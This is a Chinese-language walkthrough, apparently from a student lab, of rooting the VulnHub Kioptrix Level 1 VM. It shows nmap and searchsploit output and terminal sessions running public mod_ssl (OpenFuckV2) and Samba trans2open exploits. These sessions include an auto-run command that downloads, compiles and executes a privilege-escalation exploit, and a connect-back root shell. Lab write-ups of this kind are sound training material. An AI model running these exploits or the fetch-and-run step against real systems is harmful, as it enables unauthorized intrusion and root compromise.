---
date: 2026-10-26
categories: [Studying, CTF]
slug: nju-net-lab-1-walkthrough
---

# NJU Net Lab 1 Walkthrough

!!! note "靶机：VulnHub Kioptix Level 1"

<!-- more -->

首先写个脚本方便运行靶机

/// details | `start.sh`
    type: plain
```sh
#!/usr/bin/env bash
set -euo pipefail
cd "$(dirname "$0")"

if [[ $# -ne 1 || ! $1 =~ ^[A-Za-z0-9_-]+$ || ! -f $1.ova ]]; then
	echo "usage: $(basename "$0") <target>" >&2
	shopt -s nullglob
	for f in *.ova; do printf '  %s\n' "${f%.ova}"; done >&2
	exit 1
fi
name=$1

if ! VBoxManage list hostonlyifs | grep -q '^Name:[[:space:]]*vboxnet0$'; then
	VBoxManage hostonlyif create >&2
	VBoxManage hostonlyif ipconfig vboxnet0 --ip=192.168.56.1 --netmask=255.255.255.0 >&2
fi

if ! VBoxManage list dhcpservers | grep -q 'NetworkName:[[:space:]]*HostInterfaceNetworking-vboxnet0$'; then
	VBoxManage dhcpserver add --interface=vboxnet0 \
		--server-ip=192.168.56.100 --netmask=255.255.255.0 \
		--lower-ip=192.168.56.2 --upper-ip=192.168.56.10 --enable >&2
fi

if ! VBoxManage list vms | grep -q "^\"${name}\" "; then
	VBoxManage import "$name.ova" --vsys=0 --vmname="$name" >&2
fi

VBoxManage dhcpserver modify --interface=vboxnet0 \
	--lower-ip=192.168.56.2 --upper-ip=192.168.56.10 >&2
if ! pgrep -f VBoxNetDHCP >/dev/null; then
	VBoxManage dhcpserver start --interface=vboxnet0 >&2
fi

info=$(VBoxManage showvminfo "$name" --machinereadable)
if ! grep -q '^nic1="hostonly"$' <<<"$info" || ! grep -q '^hostonlyadapter1="vboxnet0"$' <<<"$info"; then
	if VBoxManage list runningvms | grep -q "^\"${name}\" "; then
		VBoxManage controlvm "$name" poweroff >&2
	fi
	VBoxManage modifyvm "$name" --nic1 hostonly --hostonlyadapter1 vboxnet0 >&2
fi

if ! VBoxManage list runningvms | grep -q "^\"${name}\" "; then
	VBoxManage startvm "$name" --type headless >&2
fi

mac=$(VBoxManage showvminfo "$name" --machinereadable | sed -n 's/^macaddress1="\([^"]*\)"/\1/p')
ip=
for _ in $(seq 1 90); do
	ip=$(VBoxManage dhcpserver findlease --interface=vboxnet0 --mac-address="$mac" 2>/dev/null | awk '/^IP Address:/{print $3}' || true)
	[[ -n $ip && ${ip##*.} -le 10 ]] && break
	ip=
	sleep 1
done

if [[ -z $ip ]]; then
	echo "no DHCP lease" >&2
	exit 1
fi
echo "$ip"
```
///

/// details | `stop.sh`
    type: plain
```sh
#!/usr/bin/env bash
set -euo pipefail
cd "$(dirname "$0")"

if [[ $# -ne 1 || ! $1 =~ ^[A-Za-z0-9_-]+$ || ! -f $1.ova ]]; then
	echo "usage: $(basename "$0") <target>" >&2
	shopt -s nullglob
	for f in *.ova; do printf '  %s\n' "${f%.ova}"; done >&2
	exit 1
fi
name=$1

if VBoxManage list runningvms | grep -q "^\"${name}\" "; then
	VBoxManage controlvm "$name" poweroff
fi
```
///

靶机运行在 192.168.56.2。我们开始

（本文部分参考了这个[笔记](https://csnotes.bakaburger.com/study-notes/in-class/Network-attack-and-defense-in-action/lab02/)）

## 信息收集与分析

我们直接用 nmap 分析

```
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
|_sshv1: Server supports SSHv1

80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Test Page for the Apache Web Server on Red Hat Linux

111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1          32768/tcp   status
|_  100024  1          32768/udp   status

139/tcp   open  netbios-ssn Samba smbd (workgroup: QMYGROUP)

443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-26T09:32:06
|_Not valid after:  2010-09-26T09:32:06
|_http-title: 400 Bad Request
|_ssl-date: 2026-10-26T20:25:43+00:00; +4h59m59s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|_    SSL2_RC4_128_WITH_MD5
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b

32768/tcp open  status      1 (RPC #100024)
```

我们一般不考虑在 ssh 和 rpc 方面工具。可以尝试一下通过 Apache 进行攻击，另外 Samba 没写版本但也可以试试。

## 通过 Apache 进行攻击

首先使用 `searchsploit` 寻找对应版本的漏洞

```bash
$ searchsploit apache 1.3.20
------------------------------------------------- ---------------------------------
 Exploit Title                                   |  Path
------------------------------------------------- ---------------------------------
Apache 1.3.20 (Win32) - 'PHP.exe' Remote File Di | windows/remote/21204.txt
Apache < 1.3.37/2.0.59/2.2.3 mod_rewrite - Remot | multiple/remote/2237.sh
Apache 1.3.6/1.3.9/1.3.11/1.3.12/1.3.20 - Root D | windows/remote/19975.pl
Apache 1.3.x < 2.0.48 mod_userdir - Remote Users | linux/remote/132.c
Apache < 2.0.64 / < 2.2.21 mod_setenvif - Intege | linux/dos/41769.txt
Apache < 2.2.34 / < 2.4.27 - OPTIONS Memory Leak | linux/webapps/42745.py
Apache CouchDB < 2.1.0 - Remote Code Execution   | linux/webapps/44913.py
Apache CXF < 2.5.10/2.6.7/2.7.4 - Denial of Serv | multiple/dos/26710.txt
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Re | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c'  | unix/remote/47080.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c'  | unix/remote/764.c
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote | php/remote/29290.c
Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Ex | php/remote/29316.py
Apache Struts < 1.3.10 / < 2.3.16.2 - ClassLoade | multiple/remote/41690.rb
Apache Struts < 2.2.0 - Remote Command Execution | multiple/remote/17691.rb
Apache Tika-server < 1.18 - Command Injection    | windows/remote/46540.py
Apache Tomcat < 5.5.17 - Remote Directory Listin | multiple/remote/2061.txt
Apache Tomcat < 6.0.18 - 'utf8' Directory Traver | multiple/remote/6229.txt
Apache Tomcat < 6.0.18 - 'utf8' Directory Traver | unix/remote/14489.c
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0. | jsp/webapps/42966.py
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0. | windows/webapps/42953.txt
Apache Xerces-C XML Parser < 3.1.2 - Denial of S | linux/dos/36906.txt
Oracle Java JDK/JRE < 1.8.0.131 / Apache Xerces  | php/dos/44057.md
Webfroot Shoutbox < 2.32 (Apache) - Local File I | linux/remote/34.pl
------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

可以注意到我们正好满足 `mod_ssl < 2.8.7`，所以尝试使用这个

这里包含 `remote` 字样的就是我们需要的，表示 Remote Code Execution。

```bash
$ searchsploit -m 47080
  Exploit: Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)
      URL: https://www.exploit-db.com/exploits/47080
     Path: /usr/share/exploitdb/exploits/unix/remote/47080.c
    Codes: CVE-2002-0082, OSVDB-857
 Verified: False
File Type: C source, ASCII text
Copied to: /home/sprite/net-lab/lab3/assets/apache/47080.c
$ sudo apt install libssl-dev # 装一下对应的库
$ gcc 47080.c -lcrypto
$ ./a.out

*******************************************************************
* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

: Usage: ./a.out target box [port] [-c N]

  target - supported box eg: 0x00
  box - hostname or IP address
  port - port for ssl connection
  -c open N connections. (use range 40-50 if u dont know)
```

然后我们按照脚本的提示进行尝试

```bash
$ ./a.out 0x6a 192.168.56.2 -c 40

*******************************************************************
* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

Connection... 40 of 40
Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f8050
Ready to send shellcode
Spawning shell...
Good Bye!
```

失败了。。换下一个

```bash
$ ./a.out 0x6b 192.168.56.2 -c 40

*******************************************************************
* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

Connection... 40 of 40
Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f81c8
Ready to send shellcode
Spawning shell...
bash: no job control in this shell
bash-2.05$ 
d.c; ./exploit; -kmod.c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmo 
--15:37:48--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
           => `ptrace-kmod.c'
Connecting to dl.packetstormsecurity.net:443... 
dl.packetstormsecurity.net: Host not found.
gcc: ptrace-kmod.c: No such file or directory
gcc: No input files
rm: cannot remove `ptrace-kmod.c': No such file or directory
bash: ./exploit: No such file or directory
bash-2.05$ id  
uid=48(apache) gid=48(apache) groups=48(apache)
```

似乎成功了，但是提权失败了。注意到似乎运行了一个脚本，那我们在本机下好然后直接写进去进行提权，就成功了。

```bash
bash-2.05$ vi ptrace-kmod.c
bash-2.05$ gcc ptrace-kmod.c
bash-2.05$ ./a.out
[+] Attached to 6256
[+] Waiting for signal
[+] Signal caught
[+] Shellcode placed at 0x4001189d
[+] Now wait for suid shell...
id 
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
```

## 通过 Samba 进行攻击

接下来我们试一下 Samba 能不能进行攻击。由于我们不知道他的版本，可以随便试一下

!!! tip "好像也可以通过 Apache 的版本来通过日期推断 Samba 的版本"

```
$ searchsploit Samba
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
chdir: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
------------------------------------------------- ---------------------------------
 Exploit Title                                   |  Path
------------------------------------------------- ---------------------------------
GoSamba 1.0.1 - 'INCLUDE_PATH' Multiple Remote F | php/webapps/4575.txt
Microsoft Windows XP/2003 - Samba Share Resource | windows/dos/148.sh
Samba 1.9.19 - 'Password' Remote Buffer Overflow | linux/remote/20308.c
Samba < 2.0.5 - Local Overflow                   | linux/local/19428.c
Samba 2.0.7 - SWAT Logfile Permissions           | linux/local/20341.sh
Samba 2.0.7 - SWAT Logging Failure               | unix/remote/20340.c
Samba 2.0.7 - SWAT Symlink (1)                   | linux/local/20338.c
Samba 2.0.7 - SWAT Symlink (2)                   | linux/local/20339.sh
Samba 2.0.x/2.2 - Arbitrary File Creation        | unix/remote/20968.txt
Samba 2.0.x - Insecure TMP File Symbolic Link    | linux/local/20776.c
Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow  | osx/remote/9924.rb
Samba 2.2.2 < 2.2.6 - 'nttrans' Remote Buffer Ov | linux/remote/16321.rb
Samba 2.2.8 - Brute Force Method Remote Command  | linux/remote/55.c
Samba 2.2.8 (BSD x86) - 'trans2open' Remote Over | bsd_x86/remote/16880.rb
Samba < 2.2.8 (Linux/BSD) - Remote Code Executio | multiple/remote/10.c
Samba 2.2.8 (Linux Kernel 2.6 / Debian / Mandrak | linux/local/23674.txt
Samba 2.2.8 (Linux x86) - 'trans2open' Remote Ov | linux_x86/remote/16861.rb
Samba 2.2.8 (OSX/PPC) - 'trans2open' Remote Over | osx_ppc/remote/16876.rb
Samba 2.2.8 (Solaris SPARC) - 'trans2open' Remot | solaris_sparc/remote/16330.rb
Samba 2.2.x - 'call_trans2open' Remote Buffer Ov | unix/remote/22468.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Ov | unix/remote/22469.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Ov | unix/remote/22470.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Ov | unix/remote/22471.txt
Samba 2.2.x - CIFS/9000 Server A.01.x Packet Ass | unix/remote/22356.c
Samba 2.2.x - 'nttrans' Remote Overflow (Metaspl | linux/remote/9936.rb
Samba 2.2.x - Remote Buffer Overflow             | linux/remote/7.pl
Samba 3.0.10 < 3.3.5 - Format String / Security  | multiple/remote/10095.txt
Samba 3.0.10 (OSX) - 'lsa_io_trans_names' Heap O | osx/remote/16875.rb
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow            | linux/remote/7701.txt
Samba 3.0.21 < 3.0.24 - LSA trans names Heap Ove | linux/remote/9950.rb
Samba 3.0.24 (Linux) - 'lsa_io_trans_names' Heap | linux/remote/16859.rb
Samba 3.0.24 (Solaris) - 'lsa_io_trans_names' He | solaris/remote/16329.rb
Samba 3.0.27a - 'send_mailslot()' Remote Buffer  | linux/dos/4732.c
Samba 3.0.29 (Client) - 'receive_smb_raw()' Buff | multiple/dos/5712.pl
Samba 3.0.4 - SWAT Authorisation Buffer Overflow | linux/remote/364.pl
Samba 3.3.12 (Linux x86) - 'chain_reply' Memory  | linux_x86/remote/16860.rb
Samba 3.3.5 - Format String / Security Bypass    | linux/remote/33053.txt
Samba 3.4.16/3.5.14/3.6.4 - SetInformationPolicy | linux/remote/21850.rb
Samba 3.4.5 - Symlink Directory Traversal        | linux/remote/33599.txt
Samba 3.4.5 - Symlink Directory Traversal (Metas | linux/remote/33598.rb
Samba 3.4.7/3.5.1 - Denial of Service            | linux/dos/12588.txt
Samba 3.5.0 < 4.4.14/4.5.10/4.6.4 - 'is_known_pi | linux/remote/42084.rb
Samba 3.5.0 - Remote Code Execution              | linux/remote/42060.py
Samba 3.5.11/3.6.3 - Remote Code Execution       | linux/remote/37834.py
Samba 3.5.22/3.6.17/4.0.8 - nttrans Reply Intege | linux/dos/27778.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)    | linux_x86/dos/36741.py
Samba 4.5.2 - Symlink Race Permits Opening Files | multiple/remote/41740.txt
Sambar FTP Server 6.4 - 'SIZE' Remote Denial of  | windows/dos/2934.php
Sambar Server 4.1 Beta - Admin Access            | cgi/remote/20570.txt
Sambar Server 4.2 Beta 7 - Batch CGI             | windows/remote/19761.txt
Sambar Server 4.3/4.4 Beta 3 - Search CGI        | windows/remote/20223.txt
Sambar Server 4.4/5.0 - 'pagecount' File Overwri | multiple/remote/21026.txt
Sambar Server 4.x/5.0 - Insecure Default Passwor | multiple/remote/21027.txt
Sambar Server 5.1 - Sample Script Denial of Serv | windows/dos/21228.c
Sambar Server 5.1 - Script Source Disclosure     | cgi/remote/21390.txt
Sambar Server 5.x/6.0/6.1 - logout RCredirect Cr | windows/remote/25695.txt
Sambar Server 5.x/6.0/6.1 - 'results.stm' indexn | windows/remote/25694.txt
Sambar Server 5.x/6.0/6.1 - Server Referer Cross | windows/remote/25696.txt
Sambar Server 5.x - Information Disclosure       | windows/remote/22434.txt
Sambar Server 5.x - Open Proxy / Authentication  | windows/remote/24076.txt
Sambar Server 5.x - 'results.stm' Cross-Site Scr | windows/remote/22185.txt
Sambar Server 6.0 - 'results.stm' POST Buffer Ov | windows/dos/23664.py
Sambar Server 6.1 Beta 2 - 'show.asp?show' Cross | windows/remote/24161.txt
Sambar Server 6.1 Beta 2 - 'showini.asp' Arbitra | windows/remote/24163.txt
Sambar Server 6.1 Beta 2 - 'showperf.asp?title'  | windows/remote/24162.txt
Sambar Server 6 - Search Results Buffer Overflow | windows/remote/16756.rb
SWAT Samba Web Administration Tool - Cross-Site  | cgi/webapps/17577.txt
------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

大胆尝试一下 remote 的 C 脚本，顺着试一下，从下往上试，这样覆盖的版本应该广一点

尝试一下 22356 并修改一下使其编译通过

!!! info "似乎有很多脚本都没法直接运行，一般是在不应该换行的地方换行了，或者标准太老了，稍微改改就行"

```
$ searchsploit -m 22356
  Exploit: Samba 2.2.x - CIFS/9000 Server A.01.x Packet Assembling Buffer Overflow
      URL: https://www.exploit-db.com/exploits/22356
     Path: /usr/share/exploitdb/exploits/unix/remote/22356.c
    Codes: CVE-2003-0085, OSVDB-6323
 Verified: True
File Type: C source, ASCII text
Copied to: /home/sprite/net-lab/lab3/assets/samba/22356.c
$ gcc 22356.c
$ ./a.out
```

失败了。再接着往上换 22470，仍然需要修改一下使其编译通过

```
$ searchsploit -m 22470
  Exploit: Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (3)
      URL: https://www.exploit-db.com/exploits/22470
     Path: /usr/share/exploitdb/exploits/unix/remote/22470.c
    Codes: CVE-2003-0201, OSVDB-4469
 Verified: True
File Type: C source, ASCII text
Copied to: /home/sprite/net-lab/lab3/assets/samba/22470.c
$ gcc 22470.c 
$ ./a.out
Samba < 2.2.8 Remote Root exploit by Schizoprenic
Connect back method, Xnuxer-Labs, 2003.
Usage  : ./a.out <type> <victim> <your_ip>
Targets:
         0 = Linux
         1 = FreeBSD/NetBSD
         2 = OpenBSD 3.0 and prior
         3 = OpenBSD 3.2 - non-exec stack

$ ./a.out 0 192.168.56.2 192.168.56.1
[+] Listen on port: 45295
[+] Connecting back to: [192.168.56.1:45295]
[+] Target: Linux
[+] Connected to [192.168.56.2:139]
[+] Please wait in seconds...!
[+] Yeah, I have a root ....!
------------------------------
Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
uid=0(root) gid=0(root) groups=99(nobody)
id
uid=0(root) gid=0(root) groups=99(nobody)
```

那么就成功了，还算是比较顺利。

## 总结

可以看到总的来说还是比较顺利的。感觉对于比较老的靶机，漏洞应该挺多的，所以用 searchsploit 试一试就能拿到 root 了。

nmap 没有获取 Samba 的版本号，不过由于 searchsploit 出来的脚本不多，可以挨个试一试。感觉实际上还是先通过其他程序的版本来确定年份，再通过年份推断程序的版本可能更合适。

另外，我把靶机给 ds，他居然三分钟不到就秒了。哎
